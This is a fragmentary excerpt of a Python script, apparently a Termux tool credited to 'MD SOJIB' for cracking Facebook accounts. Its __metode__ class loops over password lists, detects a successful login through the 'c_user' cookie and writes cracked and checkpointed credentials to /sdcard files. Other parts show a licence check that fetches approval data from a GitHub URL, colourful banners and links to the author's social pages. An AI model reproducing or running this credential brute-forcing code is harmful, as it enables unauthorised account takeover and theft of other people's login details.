...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.link/dh07dp?text=' + tks)

        

    r1=requests.get("https://raw.githubusercontent.com/CYB3R-A1IF/hacker-boy_SOJIB/main/approval.txt").text
...
/____/\____/\____/___/_____/  
        ...
        \033[1;92m༄SOJIB᭄•───────────────────────────────────────•༄SOJIB᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m➣    \033[1;95m𝐀𝐔𝐓𝐇𝐎𝐑   : MD SOJIB                \033[1;93m
             \033[1;93m➣    \033[1;94m𝐆𝐈𝐓𝐇𝐔𝐁   : ༺CYB3R-SOJIB༻                   \033[1;93m
             \033[1;93m➣    \033[1;93m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 :Md SOJIB             \033[1;93m
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/SOJIB-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/SOJIB-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back SOJIB Menu ")
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mBEST OF LUCK MY DEAR USER  : SOJIB-SOJIB")
			print ('\033[1;92mSOJIB')
			key = input(" [*] Choose : ")
			print ('SOJIB')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[SOJIB]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/SOJIB_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/SOJIB_CP.txt' , 'a').write('%s\n' % wrt)
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/Cyber.420.SOJIB")
